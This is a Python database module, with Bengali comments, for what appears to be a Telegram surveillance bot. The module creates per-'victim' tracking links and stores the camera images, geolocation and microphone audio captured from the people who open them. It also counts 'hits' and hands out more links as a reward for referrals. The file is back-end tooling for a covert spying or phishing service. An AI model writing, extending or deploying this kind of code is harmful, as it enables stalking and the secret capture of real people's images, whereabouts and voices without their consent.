import sqlite3
import json
import os
import threading
from datetime import datetime, timedelta
from config import DB_PATH, DB_DIR, REQUIRED_REFS, FREE_LINKS, MAX_LINKS_PER_HOUR


class Database:
    _instance = None
    _lock = threading.Lock()

    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
                    cls._instance._initialized = False
        return cls._instance

    def __init__(self):
        if self._initialized:
            return
        self._initialized = True
        self._local = threading.local()
        self._init_db()

    def _get_conn(self):
        """থ্রেড-লোকাল কানেকশন"""
        if not hasattr(self._local, 'conn') or self._local.conn is None:
            os.makedirs(DB_DIR, exist_ok=True)
            self._local.conn = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=10)
            self._local.conn.row_factory = sqlite3.Row
            self._local.conn.execute("PRAGMA journal_mode=WAL")
            self._local.conn.execute("PRAGMA busy_timeout=5000")
            self._local.conn.execute("PRAGMA synchronous=NORMAL")
            self._local.conn.execute("PRAGMA cache_size=-8000")
        return self._local.conn

    @property
    def conn(self):
        return self._get_conn()

    @property
    def c(self):
        return self.conn.cursor()

    def _init_db(self):
        """টেবিল তৈরি"""
        self.c.execute("""
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                telegram_id INTEGER UNIQUE NOT NULL,
                username TEXT DEFAULT 'Unknown',
                first_name TEXT DEFAULT '',
                join_date TEXT NOT NULL,
                referred_by INTEGER DEFAULT NULL,
                refer_count INTEGER DEFAULT 0,
                total_links_created INTEGER DEFAULT 0,
                is_banned INTEGER DEFAULT 0,
                last_link_time TEXT DEFAULT NULL
            )
        """)
        self.c.execute("""
            CREATE TABLE IF NOT EXISTS victims (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_code TEXT UNIQUE NOT NULL,
                telegram_id INTEGER NOT NULL,
                created_at TEXT NOT NULL,
                camera_url TEXT,
                location_url TEXT,
                audio_url TEXT,
                camera_data TEXT DEFAULT NULL,
                location_data TEXT DEFAULT NULL,
                audio_data TEXT DEFAULT NULL,
                access_count INTEGER DEFAULT 0,
                last_access TEXT DEFAULT NULL,
                FOREIGN KEY (telegram_id) REFERENCES users(telegram_id)
            )
        """)
        self.c.execute("""
            CREATE TABLE IF NOT EXISTS referral_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                referrer_id INTEGER NOT NULL,
                referred_id INTEGER NOT NULL,
                timestamp TEXT NOT NULL,
                FOREIGN KEY (referrer_id) REFERENCES users(telegram_id),
                FOREIGN KEY (referred_id) REFERENCES users(telegram_id),
                UNIQUE(referrer_id, referred_id)
            )
        """)
        self.conn.commit()

    # ==================== ইউজার অপারেশন ====================

    def get_user(self, telegram_id):
        self.c.execute("SELECT * FROM users WHERE telegram_id=?", (telegram_id,))
        return self.c.fetchone()

    def create_user(self, telegram_id, username, first_name=""):
        now = datetime.now().isoformat()
        try:
            self.c.execute("""
                INSERT OR IGNORE INTO users (telegram_id, username, first_name, join_date)
                VALUES (?, ?, ?, ?)
            """, (telegram_id, username, first_name, now))
            self.conn.commit()
            return True
        except Exception:
            return False

    def get_available_links(self, telegram_id):
        """ইউজারের কতগুলি লিংক বাকি আছে"""
        user = self.get_user(telegram_id)
        if not user:
            return 0
        if user['is_banned']:
            return 0

        ref_links = user['refer_count'] // REQUIRED_REFS
        total_allowed = FREE_LINKS + ref_links

        self.c.execute("SELECT COUNT(*) FROM victims WHERE telegram_id=?", (telegram_id,))
        used = self.c.fetchone()[0]

        return max(0, total_allowed - used)

    def create_victim(self, telegram_id, victim_code, camera_url, location_url, audio_url):
        now = datetime.now().isoformat()
        try:
            self.c.execute("BEGIN IMMEDIATE")
            self.c.execute("""
                INSERT INTO victims (victim_code, telegram_id, created_at, camera_url, location_url, audio_url)
                VALUES (?, ?, ?, ?, ?, ?)
            """, (victim_code, telegram_id, now, camera_url, location_url, audio_url))
            self.c.execute("""
                UPDATE users SET total_links_created = total_links_created + 1, last_link_time = ?
                WHERE telegram_id=?
            """, (now, telegram_id))
            self.conn.commit()
            return True
        except Exception as e:
            self.conn.rollback()
            return False

    def add_referral(self, referrer_id, referred_id):
        now = datetime.now().isoformat()
        try:
            self.c.execute("BEGIN IMMEDIATE")

            # চেক ডুপ্লিকেট
            self.c.execute("""
                SELECT id FROM referral_log
                WHERE referrer_id=? AND referred_id=?
            """, (referrer_id, referred_id))
            if self.c.fetchone():
                self.conn.rollback()
                return False

            # চেক যেন একই ইউজার না
            if referrer_id == referred_id:
                self.conn.rollback()
                return False

            self.c.execute("""
                INSERT INTO referral_log (referrer_id, referred_id, timestamp)
                VALUES (?, ?, ?)
            """, (referrer_id, referred_id, now))

            self.c.execute("""
                UPDATE users SET refer_count = refer_count + 1 WHERE telegram_id=?
            """, (referrer_id,))

            self.c.execute("""
                UPDATE users SET referred_by=? WHERE telegram_id=? AND referred_by IS NULL
            """, (referrer_id, referred_id))

            self.conn.commit()
            return True
        except Exception as e:
            self.conn.rollback()
            return False

    # ==================== ভিক্টিম অপারেশন ====================

    def update_victim_data(self, victim_code, data_type, data):
        column = 'camera_data'
        if data_type in ('location', 'location_data'):
            column = 'location_data'
        elif data_type in ('audio', 'audio_data'):
            column = 'audio_data'

        now = datetime.now().isoformat()
        json_data = json.dumps(data) if isinstance(data, (dict, list)) else str(data)

        try:
            self.c.execute(f"""
                UPDATE victims SET {column}=?, access_count = access_count + 1, last_access=?
                WHERE victim_code=?
            """, (json_data, now, victim_code))
            self.conn.commit()
            return True
        except Exception:
            return False

    def get_victim_owner(self, victim_code):
        self.c.execute("SELECT telegram_id FROM victims WHERE victim_code=?", (victim_code,))
        row = self.c.fetchone()
        return row['telegram_id'] if row else None

    def get_victim(self, victim_code):
        self.c.execute("SELECT * FROM victims WHERE victim_code=?", (victim_code,))
        return self.c.fetchone()

    def get_user_victims(self, telegram_id, limit=50, offset=0):
        self.c.execute("""
            SELECT victim_code, created_at, camera_data, location_data, audio_data, access_count, last_access
            FROM victims WHERE telegram_id=?
            ORDER BY created_at DESC LIMIT ? OFFSET ?
        """, (telegram_id, limit, offset))
        return self.c.fetchall()

    def delete_victim(self, victim_code, telegram_id):
        """শুধুমাত্র মালিক মুছতে পারে"""
        self.c.execute("""
            DELETE FROM victims WHERE victim_code=? AND telegram_id=?
        """, (victim_code, telegram_id))
        self.conn.commit()
        return self.c.rowcount > 0

    # ==================== রেট লিমিট ====================

    def is_rate_limited(self, telegram_id):
        one_hour_ago = (datetime.now() - timedelta(hours=1)).isoformat()
        self.c.execute("""
            SELECT COUNT(*) FROM victims
            WHERE telegram_id=? AND created_at > ?
        """, (telegram_id, one_hour_ago))
        count = self.c.fetchone()[0]
        return count >= MAX_LINKS_PER_HOUR

    # ==================== গ্লোবাল স্ট্যাটস ====================

    def get_global_stats(self):
        self.c.execute("SELECT COUNT(*) FROM users")
        total_users = self.c.fetchone()[0]

        self.c.execute("SELECT COUNT(*) FROM victims")
        total_victims = self.c.fetchone()[0]

        self.c.execute("SELECT COUNT(*) FROM victims WHERE camera_data IS NOT NULL")
        camera_hits = self.c.fetchone()[0]

        self.c.execute("SELECT COUNT(*) FROM victims WHERE location_data IS NOT NULL")
        location_hits = self.c.fetchone()[0]

        self.c.execute("SELECT COUNT(*) FROM victims WHERE audio_data IS NOT NULL")
        audio_hits = self.c.fetchone()[0]

        return {
            'total_users': total_users,
            'total_victims': total_victims,
            'camera_hits': camera_hits,
            'location_hits': location_hits,
            'audio_hits': audio_hits
        }

    # ==================== ডাটা পার্স ====================

    def safe_load_json(self, data_str):
        """JSON সেফলি পার্স করে"""
        if not data_str:
            return None
        try:
            return json.loads(data_str)
        except (json.JSONDecodeError, TypeError):
            return data_str


# সিংগলটন
db = Database()
